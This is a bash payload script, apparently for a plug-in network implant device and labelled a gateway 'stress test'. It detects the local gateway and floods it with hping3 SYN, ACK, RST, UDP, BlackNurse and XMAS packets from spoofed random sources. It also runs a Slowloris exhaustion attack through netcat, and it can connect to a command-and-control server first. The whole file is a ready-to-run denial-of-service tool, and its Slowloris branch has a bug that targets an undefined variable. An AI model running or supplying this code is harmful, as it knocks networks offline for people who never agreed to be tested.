#!/bin/bash
#
# Title:        Flood Gateway (Stress Test)
# Author:       InfoSecREDD
# Version:      1.2
#
# Description:	This payload detects the Gateway IP then proceeds to
# flood the Gateway IP by sending SYN/ACK/RST/UDP Packets or using 
# SLOWLORIS/BlackNurse/XMAS Attacks. (More options to come)
#
# Common Ports to Attack: 80 (TCP), 8080(TCP), 53 (UDP), 3389 (TCP), the
#  rest is up to you.
#
#  Defaults to SYN Attack.
#
# LED SETUP (Magenta)       Setting NETMODE and detecting GW IP.
# LED Yellow thru Magenta   Waiting Ethernet Plug connection.
# LED White thru Magenta    Waiting Connection to Public Website.
# LED Red Blink             No Gateway IP Address, waiting 15 seconds.
# LED Red Solid             No Gateway IP Address, exiting script.
# LED Cyan Blink to Solid   Connected to C2. (Optional)
# LED Yellow thru Green     Attacking Gateway IP with Hping3.
# LED Green Solid           Attack has Finished.
#
# NOTE: SLOWLORIS Attack does NOT use the DURATION Variable. It runs until
#       connections/resources run out.
#
#       BlackNurse Attack does NOT use the PORT Variable. It runs against the
#       ICMP(Ping) port.
#

# Type of Attack to perform.
ATTACK="SYN"

# Port to Attack.
PORT="80"

# Amount of time you wish to Stress Test your Gateway. (Hint: 600 seconds is 10 minutes)
DURATION="30"

# Turn to YES if you want to connect to C2 BEFORE Attack.
C2_CONNECTION="YES"

## Settings for SLOWLORIS Attack. (Only supports HTTP Attack, NOT SSL - HTTPS)
HTTP_CONNECTIONS="200"

TEST_URL="http://website-url-here.com"

# Start the Script! Man your Stations!
LED SETUP;
NETMODE DHCP_CLIENT;
function net_connect() {
        while ! ifconfig eth0 | grep "inet addr"; do
                LED Y SOLID; sleep .2;
                LED M SOLID; sleep .8;
        done

        while ! wget $TEST_URL -qO /dev/null; do
                LED W SOLID; sleep .2;
                LED M SOLID; sleep .8;
        done

        GATEWAY_IP=$(ip route list dev eth0 | awk ' /^default/ {print $3}')
        # Detect Gateway IP, if none exit
        if [ -z $GATEWAY_IP ]; then
                i=0
                for i in {1..15}; do
                        if [ "$i" -le "15" ]; then
                                LED R SOLID; sleep .2;
                                LED OFF;sleep .8;
                        else
                                LED R SOLID;
                                exit 0;
                        fi
                done
        fi
        if [ "$C2_CONNECTION" == "YES" ]; then
                LED C VERYFAST;
                C2CONNECT;
                while ! pgrep cc-client; do
                        LED C FAST;sleep 1;
                done
                LED C SOLID; sleep .5;
        fi
}

net_connect;

# Prepare the Flashy Colors!
function led_attack() {
        LED G SOLID; sleep .2;
        LED Y SOLID; sleep .8;
}
function led_attack_dur() {
        for (( i=1; i<=$DURATION; i++ )); do
                LED G SOLID; sleep .2;
                LED Y SOLID; sleep .8;
        done
}

# Arm the platoon!
function attack() {
if [ $ATTACK = "SYN" ]; then
        led_attack;
        hping3 --flood -d 4096 --frag --rand-source -p $PORT -S $GATEWAY_IP &
        HPING_PID=$!
        led_attack_dur;
        kill $HPING_PID;
fi
if [ $ATTACK = "ACK" ]; then
        led_attack;
        hping3 --flood -d 4096 --frag --rand-source -p $PORT -A $GATEWAY_IP &
        HPING_PID=$!
        led_attack_dur;
        kill $HPING_PID;
fi
if [ $ATTACK = "RST" ]; then
        led_attack;
        hping3 --flood -d 4096 --frag --rand-source -p $PORT -R $GATEWAY_IP &
        HPING_PID=$!
        led_attack_dur;
        kill $HPING_PID;
fi
if [ $ATTACK = "UDP" ]; then
        led_attack;
        hping3 --flood --udp --sign 4096 -p $PORT $GATEWAY_IP &
        HPING_PID=$!
        led_attack_dur;
        kill $HPING_PID;
fi
if [ $ATTACK = "BLACKNURSE" ]; then
        led_attack;
        hping3 -1 -C 3 -K 3 --flood --rand-source $GATEWAY_IP &
        HPING_PID=$!
        led_attack_dur;
        kill $HPING_PID;
fi
if [ $ATTACK = "XMAS" ]; then
        led_attack;
        hping3 --flood -d 4096 --rand-source -p $PORT -F -S -R -P -A -U -X -Y $GATEWAY_IP &
        HPING_PID=$!
        led_attack_dur;
        kill $HPING_PID;
fi
if [ $ATTACK = "SLOWLORIS" ]; then
        led_attack;
		if [ "$PORT" != "80" ] || [ "$PORT" != "8080" ]; then
			PORT="80"
		fi
		INTERVAL=$((RANDOM % 11 + 5))
		i=1
		while [ "$i" -le "$HTTP_CONNECTIONS" ]; do
				# Use Netcat to create a keep-alive connection to the Gateway IP.
				echo -e "GET / HTTP/1.1\r\nHost: $GATEWAY_IP\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null &
				led_attack;
				i=$((i + 1));
		done
fi

LED FINISH
}

# Simple fix for changing arguments to CAPS
arg1=$1
ARG_FIX=$( echo "$arg1" | tr '[a-z]' '[A-Z]' )

# Start the Attack! CHHHAAARRRGGGEEE!!
if [ "$ARG_FIX" == "ACK" ]; then
        ATTACK="ACK"
        attack;
elif [ "$ARG_FIX" == "SYN" ]; then
        ATTACK="SYN"
        attack;
elif [ "$ARG_FIX" == "RST" ]; then
        ATTACK="RST"
        attack;
elif [ "$ARG_FIX" == "UDP" ]; then
        ATTACK="UDP"
        attack;
elif [ "$ARG_FIX" == "BLACKNURSE" ]; then
        ATTACK="BLACKNURSE"
        attack;
elif [ "$ARG_FIX" == "XMAS" ]; then
        ATTACK="XMAS"
        attack;
elif [ "$ARG_FIX" == "SLOWLORIS" ]; then
        ATTACK="SLOWLORIS"
        attack;
elif [ -z $1 ]; then
		# Run ATTACK Variable from beginning of Script.
        attack;
else
        printf "That is not a correct Packet Attack type.\n\n Supported Types: SYN, ACK, UDP, RST, XMAS, BLACKNURSE and SLOWLORIS\n"
        exit 1
fi
